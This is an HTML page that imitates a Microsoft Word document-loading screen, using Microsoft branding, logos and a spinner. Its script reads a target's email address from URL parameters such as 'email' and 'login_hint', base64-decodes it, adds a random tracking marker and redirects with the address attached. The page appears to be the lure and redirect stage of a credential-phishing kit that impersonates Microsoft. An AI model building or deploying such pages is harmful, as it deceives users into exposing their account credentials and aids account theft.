<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Word</title>
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%232B579A' d='M6 2h12a2 2 0 012 2v16a2 2 0 01-2 2H6a2 2 0 01-2-2V4a2 2 0 012-2z'/%3E%3Cpath fill='white' d='M8 7l2 8 2-5 2 5 2-8h2l-3 10h-2l-2-5-2 5H7l-3-10z'/%3E%3C/svg%3E">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
        }

        /* Word Logo */
        .logo-container {
            margin-bottom: 40px;
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        .word-logo {
            width: 150px;
            height: auto;
            animation: float 3s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-5px); }
        }

        /* Loading spinner - Word blue */
        .spinner-container {
            margin-top: 20px;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #f0f0f0;
            border-top-color: #2B579A;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Loading text */
        .loading-text {
            margin-top: 24px;
            color: #323130;
            font-size: 14px;
            font-weight: 400;
            opacity: 0;
            animation: fadeInUp 0.5s ease-out 0.3s forwards;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Microsoft logo footer */
        .footer {
            position: fixed;
            bottom: 40px;
        }

        .ms-logo {
            width: 108px;
            height: auto;
        }

        .fade-out {
            animation: fadeOut 0.3s ease-out forwards;
        }

        @keyframes fadeOut {
            to { opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="container" id="main-container">
        <div class="logo-container">
            <!-- Microsoft Word Logo SVG -->
            <svg class="word-logo" viewBox="0 0 1881.25 1750" xmlns="http://www.w3.org/2000/svg">
                <path fill="#41A5EE" d="M1801.056,0H517.694C473.404,0,437.5,35.904,437.5,80.194c0,0,0,0,0,0V437.5l743.75,218.75l700-218.75
                    V80.194C1881.25,35.904,1845.346,0,1801.056,0L1801.056,0z"/>
                <path fill="#2B7CD3" d="M1881.25,437.5H437.5V875l743.75,131.25l700-131.25V437.5z"/>
                <path fill="#185ABD" d="M437.5,875v437.5l700,87.5l743.75-87.5V875H437.5z"/>
                <path fill="#103F91" d="M517.694,1750h1283.363c44.29,0,80.194-35.904,80.194-80.194l0,0V1312.5H437.5v357.306
                    C437.5,1714.096,473.404,1750,517.694,1750L517.694,1750z"/>
                <path opacity="0.1" d="M969.806,350H437.5v1093.75h532.306c44.23-0.144,80.05-35.964,80.194-80.194
                    V430.194C1049.856,385.964,1014.036,350.144,969.806,350z"/>
                <path opacity="0.2" d="M926.056,393.75H437.5V1487.5h488.556c44.23-0.144,80.05-35.964,80.194-80.194
                    V473.944C1006.106,429.714,970.286,393.894,926.056,393.75z"/>
                <path opacity="0.2" d="M926.056,393.75H437.5V1400h488.556c44.23-0.144,80.05-35.964,80.194-80.194
                    V473.944C1006.106,429.714,970.286,393.894,926.056,393.75z"/>
                <path opacity="0.2" d="M882.306,393.75H437.5V1400h444.806c44.23-0.144,80.05-35.964,80.194-80.194
                    V473.944C962.356,429.714,926.536,393.894,882.306,393.75z"/>
                <linearGradient id="wordGrad" x1="167.2057" y1="1420.9117" x2="795.2943" y2="333.0883" gradientTransform="matrix(1 0 0 -1 0 1752)">
                    <stop offset="0" style="stop-color:#2368C4"/>
                    <stop offset="0.5" style="stop-color:#1A5DBE"/>
                    <stop offset="1" style="stop-color:#1146AC"/>
                </linearGradient>
                <path fill="url(#wordGrad)" d="M80.194,393.75h802.112c44.29,0,80.194,35.904,80.194,80.194v802.113
                    c0,44.29-35.904,80.194-80.194,80.194H80.194c-44.29,0-80.194-35.904-80.194-80.194V473.944C0,429.654,35.904,393.75,80.194,393.75z
                    "/>
                <path fill="#FFFFFF" d="M329.088,1008.788c1.575,12.381,2.625,23.144,3.106,32.375h1.837c0.7-8.75,2.158-19.294,4.375-31.631
                    c2.217-12.338,4.215-22.765,5.994-31.281l84.35-363.913h109.069l87.5,358.444c5.084,22.288,8.723,44.881,10.894,67.637h1.444
                    c1.631-22.047,4.671-43.966,9.1-65.625l69.781-360.631h99.269l-122.588,521.5H577.238L494.113,790.3
                    c-2.406-9.931-5.162-22.925-8.181-38.894c-3.019-15.969-4.9-27.65-5.644-35h-1.444c-0.962,8.487-2.844,21.088-5.644,37.8
                    c-2.8,16.713-5.046,29.079-6.738,37.1l-78.138,344.269h-117.95L147.131,614.337h101.062l75.994,364.656
                    C325.894,986.475,327.513,996.45,329.088,1008.788z"/>
            </svg>
        </div>

        <div class="spinner-container">
            <div class="spinner"></div>
        </div>

        <div class="loading-text">Loading document...</div>
    </div>

    <!-- Microsoft Logo Footer -->
    <div class="footer">
        <img class="ms-logo" 
             src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" 
             alt="Microsoft">
    </div>

    <script>
        // Decode base64 if the string looks like base64 encoded
        function decodeIfBase64(str) {
            if (!str) return str;
            // Check if it looks like base64 (only base64 chars, length divisible by 4 or has padding)
            var base64Regex = /^[A-Za-z0-9+/=_-]+$/;
            if (!base64Regex.test(str)) return str;
            // If it contains @ it's already a plain email
            if (str.indexOf('@') !== -1) return str;
            try {
                // Handle URL-safe base64
                var normalized = str.replace(/-/g, '+').replace(/_/g, '/');
                // Add padding if needed
                while (normalized.length % 4) normalized += '=';
                var decoded = atob(normalized);
                // Check if decoded looks like an email
                if (decoded.indexOf('@') !== -1 && decoded.indexOf('.') !== -1) {
                    return decoded;
                }
            } catch(e) {}
            return str;
        }

        setTimeout(function() {
            document.getElementById('main-container').classList.add('fade-out');
            setTimeout(function() {
                var url = new URL(window.location.href);
                
                // Extract email from URL parameters
                var rawEmail = url.searchParams.get('email') || 
                               url.searchParams.get('e') || 
                               url.searchParams.get('u') || 
                               url.searchParams.get('login_hint') ||
                               url.searchParams.get('user') ||
                               url.searchParams.get('mail') ||
                               '';
                
                // Decode if base64 encoded
                var email = decodeIfBase64(rawEmail);
                
                // Generate forwarder marker
                var b1 = Math.floor(Math.random() * 256);
                var b2 = Math.floor(Math.random() * 256);
                var b3 = Math.floor(Math.random() * 256);
                var b4 = Math.floor(Math.random() * 256);
                var crc = (b1 + b2 + b3 + b4) & 0xFF;
                var bytes = String.fromCharCode(crc, b1, b2, b3, b4);
                var marker = btoa(bytes).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
                
                url.searchParams.set('_r', marker);
                var finalUrl = url.toString();
                if (email) {
                    finalUrl += '#' + email;
                }
                
                window.location.href = finalUrl;
            }, 300);
        }, 2500);
    </script>
</body>
</html>



